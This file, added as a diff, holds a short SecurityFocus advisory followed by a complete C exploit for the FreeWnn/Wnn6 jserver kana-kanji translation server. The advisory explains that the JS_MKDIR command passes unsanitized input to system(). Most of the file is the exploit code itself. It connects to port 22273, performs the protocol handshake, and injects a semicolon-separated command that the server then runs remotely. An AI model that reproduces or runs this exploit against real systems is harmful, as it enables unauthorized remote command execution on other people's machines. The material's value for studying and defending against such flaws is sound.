@@ -1,0 +1,106 @@
+source: http://www.securityfocus.com/bid/3860/info
+
+FreeWnn 1.1.0 is a kana-kanji (japanese) translation system. This software is a client-server type application, with the jserver portion acting as a server and performing translations for clients. The jserver component passes unsanitized input from the client via the JS_MKDIR command to a system() libcall, allowing arbitrary command execution with the semi-colon ";" command separation metacharacter. Commands sent in this manner will be executed at the privilege level of the jserver process. 
+
+/*=========================================================================
+   Wnn6 Exploit (tested on IRIX6.5 WorldView Janapese)
+   The Shadow Penguin Security (http://www.shadowpenguin.org)
+   Written by UNYUN (unyun@shadowpenguin.org)
+  =========================================================================
+*/
+#include <stdio.h>
+#include <netdb.h>
+#include <fcntl.h>
+#include <ctype.h>
+#include <unistd.h>
+#include <strings.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <netinet/in.h>
+
+#define TARGET_PORT 22273
+
+int dump_recv(int sockfd)
+{
+    static char buf[4096];
+    int i,r,sum=0;
+
+    r=recv(sockfd,buf,sizeof(buf),0);
+    for (i=0;i<r;i++){
+        printf("0x%02X ",buf[i]&0xff);
+        sum+=(int)buf[i];
+    }
+    printf("\n");
+    return(sum);
+}
+
+main(int argc,char *argv[])
+{
+    int                 sockfd,i;
+    struct sockaddr_in  target;
+    struct hostent      *hs;
+    static char         buf[512];
+    static char         mkdircmd[4096];
+    char                hostname[4096];
+    char                username[4096];
+
+    if (argc<3){
+        printf("usage : %s TargetHost command {hostname} {username}\n",argv[0]);
+        exit(1);
+    }
+    strcpy(hostname,"localhost");
+    strcpy(username,"root");
+    if (argc>=5)
+        strcpy(username,argv[4]);
+    if (argc>=4)
+        strcpy(hostname,argv[3]);
+    sockfd=socket(PF_INET, SOCK_STREAM, 0);
+    target.sin_family=AF_INET;
+    target.sin_port=htons(TARGET_PORT);
+    if ((target.sin_addr.s_addr=inet_addr(argv[1]))==-1){
+        if ((hs=gethostbyname(argv[1]))==NULL){
+            printf("Can not resolve specified host.\n");
+            exit(1);
+        }
+        target.sin_family = hs->h_addrtype;
+        memcpy((caddr_t)&target.sin_addr.s_addr,hs->h_addr,hs->h_length);
+    }
+    if (connect(sockfd, (struct sockaddr*)&target, sizeof(target))!=0){
+        printf("Can not connect to %s:%d\n",argv[1],TARGET_PORT);
+        exit(1);
+    } 
+
+    /* JS_OPEN */
+    buf[3]=1;
+    buf[6]=0x4f;
+    strncpy(buf+8,hostname,strlen(hostname));
+    strncpy(buf+9+strlen(hostname),username,strlen(username));
+    send(sockfd,buf,10+strlen(hostname)+strlen(username),0);
+    dump_recv(sockfd);
+
+    /* JS_ENV_EXIST */
+    memset(buf,0,sizeof(buf));
+    buf[3]=0x07;
+    strncpy(buf+4,username,strlen(username));
+    send(sockfd,buf,5+strlen(username),0);
+    dump_recv(sockfd);
+
+    /* JS_CONNECT */
+    memset(buf,0,sizeof(buf));
+    buf[3]=0x05;
+    strncpy(buf+4,username,strlen(username));
+    send(sockfd,buf,5+strlen(username),0);
+    dump_recv(sockfd);
+
+    /* JS_MKDIR */
+    sprintf(mkdircmd,"a;%s",argv[2]);
+    memset(buf,0,sizeof(buf));
+    buf[3]=0x51;
+    strncpy(buf+8,mkdircmd,strlen(mkdircmd));
+    send(sockfd,buf,8+strlen(mkdircmd)+1,0);
+    dump_recv(sockfd);
+
+    close(sockfd);
+}
+
